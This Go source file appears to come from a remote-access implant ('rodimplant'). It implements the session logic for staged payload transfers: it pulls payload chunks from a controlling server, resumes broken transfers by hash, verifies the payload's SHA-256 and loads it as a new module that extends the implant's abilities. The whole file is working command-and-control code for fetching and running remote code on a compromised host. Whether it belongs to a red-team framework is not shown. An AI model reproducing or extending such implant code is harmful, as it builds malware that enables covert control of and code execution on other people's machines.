// The staged transfer state (ADR-010, architecture.md Sec 10): the
// downstream bulk arm a module.load rides. A task whose bytes are staged
// registers here instead of executing; the session demands the payload in
// chunks, places them by absolute offset, and dispatches the verb once the
// terminal chunk lands -- the placement rules and report lines mirror the
// reference implant's session (src/implant/rust/src/session.rs), so the two
// hosts behave identically against the same server.
package session

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"hash"
	"sort"
	"strings"

	"rodimplant/internal/wire"
)

// Cycles a staged transfer may make no progress before the session fails
// its task -- the honest end of a demand the carrier never served.
const stagedIdleCycles = 3

// stagedPending is one transfer: the held prefix, the running hash over it,
// and the idle patience. Held bytes survive failed contacts, so a resumed
// demand proves the prefix by hash instead of re-serving it.
type stagedPending struct {
	task       *wire.TaskRequest
	held       []byte
	hasher     hash.Hash
	lastLen    int
	idleCycles int
}

// demandStaged registers a staged task's transfer. Idempotent: a redelivered
// staged task re-demands from what is already held.
func (s *Session) demandStaged(task *wire.TaskRequest) {
	if _, held := s.staged[task.TaskId]; !held {
		s.staged[task.TaskId] = &stagedPending{task: task, hasher: sha256.New()}
	}
}

// StagedDemands answers the pending transfers' demand frames, one per
// transfer at its current seam: a fresh transfer sends the plain shape, a
// resumed one names the bytes it holds and proves them by hash. Regenerated
// every cycle -- a cycle that dies mid-run leaves the held bytes in place,
// so the next demand resumes instead of re-pulling the payload whole.
func (s *Session) StagedDemands() []*wire.Frame {
	ids := make([]string, 0, len(s.staged))
	for id := range s.staged {
		ids = append(ids, id)
	}
	sort.Strings(ids)
	frames := make([]*wire.Frame, 0, len(ids))
	for _, id := range ids {
		pull := &wire.StagedPull{TaskId: id}
		if held := s.staged[id]; len(held.held) > 0 {
			offset := uint64(len(held.held))
			pull.Offset = &offset
			pull.PrefixSha256 = hashSum(held.hasher)
		}
		frames = append(frames, FrameOf(pull, wire.FrameKind_FRAME_KIND_STAGED_PULL))
	}
	return frames
}

// acceptStagedChunk places one chunk of a staged transfer. A chunk naming
// its absolute offset places there: offset 0 over a non-empty hold is the
// server's restart signal and resets the transfer, a chunk the hold already
// covers is a duplicate no-op, and a gap is left unplaced -- the next demand
// re-establishes the seam. A chunk without the field comes from a pre-resume
// server: sequence 0 over a non-empty hold restarts, anything else appends
// in arrival order. The terminal chunk dispatches the task against the held
// bytes and reports the payload's hash with the result -- the both-side
// arm's implant half.
func (s *Session) acceptStagedChunk(chunk *wire.StagedChunk) {
	pending, held := s.staged[chunk.TaskId]
	if !held {
		return
	}
	if chunk.Offset != nil {
		offset := int(*chunk.Offset)
		switch {
		case offset == len(pending.held):
			pending.hasher.Write(chunk.Data)
			pending.held = append(pending.held, chunk.Data...)
		case offset == 0 && len(pending.held) > 0:
			// The server restarted the transfer whole.
			pending.held = append(pending.held[:0], chunk.Data...)
			pending.hasher.Reset()
			pending.hasher.Write(chunk.Data)
		case offset+len(chunk.Data) <= len(pending.held):
			// An already-covered duplicate: placement is a no-op, the
			// terminal flag still resolves the transfer.
		default:
			// A gap the hold cannot place: keep the state, re-demand.
			return
		}
	} else if chunk.Sequence == 0 && len(pending.held) > 0 {
		pending.held = append(pending.held[:0], chunk.Data...)
		pending.hasher.Reset()
		pending.hasher.Write(chunk.Data)
	} else {
		pending.hasher.Write(chunk.Data)
		pending.held = append(pending.held, chunk.Data...)
	}

	if !chunk.Terminal {
		return
	}
	delete(s.staged, chunk.TaskId)
	payloadSha := hex.EncodeToString(hashSum(pending.hasher))
	outcome, output := s.dispatchStaged(pending.task.Verb, pending.task.Arguments, pending.held)
	s.queueResultWithSha(chunk.TaskId, outcome, output, nil, payloadSha)
}

// StagedCycleEnd runs at every contact boundary: a transfer that grew keeps
// its patience, one that made no progress counts an idle cycle, and one
// idle past the bound fails its task.
func (s *Session) StagedCycleEnd() {
	ids := make([]string, 0, len(s.staged))
	for id := range s.staged {
		ids = append(ids, id)
	}
	for _, id := range ids {
		pending := s.staged[id]
		switch {
		case len(pending.held) > pending.lastLen:
			pending.lastLen = len(pending.held)
			pending.idleCycles = 0
		case pending.idleCycles+1 >= stagedIdleCycles:
			delete(s.staged, id)
			s.queueResult(id, wire.TaskOutcome_TASK_OUTCOME_FAILED,
				"staged payload stream ended without a terminal chunk", nil)
		default:
			pending.idleCycles++
		}
	}
}

// dispatchStaged is the staged dispatch arm: the payload arrived, the
// arguments carry the grammar. module.load hands the bytes to the module
// registry (architecture.md Sec 5.4); anything this build carries no staged
// handler for fails with the grammar named.
func (s *Session) dispatchStaged(verb, arguments string, payload []byte) (wire.TaskOutcome, string) {
	space := strings.LastIndexByte(arguments, ' ')
	if space < 0 {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED,
			fmt.Sprintf("%s staged expects '<...> sha256:<hex>'", verb)
	}
	name := strings.TrimSpace(arguments[:space])
	expected, token := strings.CutPrefix(strings.TrimSpace(arguments[space+1:]), "sha256:")
	if !token {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED,
			fmt.Sprintf("%s staged expects '<...> sha256:<hex>'", verb)
	}
	sum := sha256.Sum256(payload)
	actual := hex.EncodeToString(sum[:])
	if !strings.EqualFold(actual, expected) {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED,
			fmt.Sprintf("%s staged: payload hash mismatch: expected %s, received %s", verb, expected, actual)
	}
	if verb == "module.load" {
		if name == "" {
			return wire.TaskOutcome_TASK_OUTCOME_FAILED,
				"module.load staged expects '<name> sha256:<hex>'"
		}
		report, err := s.plugins.Load(name, payload, expected)
		if err != nil {
			return wire.TaskOutcome_TASK_OUTCOME_FAILED, err.Error()
		}
		// The routes widened: the next handshake advertises them.
		return wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, report
	}
	return wire.TaskOutcome_TASK_OUTCOME_FAILED,
		fmt.Sprintf("%s: this build carries no staged handler for the verb", verb)
}

// hashSum answers the running hash's digest without consuming it: the
// sha256 digest serializes its state, so the prefix proof and the terminal
// payload hash both read a clone.
func hashSum(h hash.Hash) []byte {
	state, err := h.(interface{ MarshalBinary() ([]byte, error) }).MarshalBinary()
	if err != nil {
		return nil
	}
	clone := sha256.New()
	if err := clone.(interface{ UnmarshalBinary([]byte) error }).UnmarshalBinary(state); err != nil {
		return nil
	}
	return clone.Sum(nil)
}
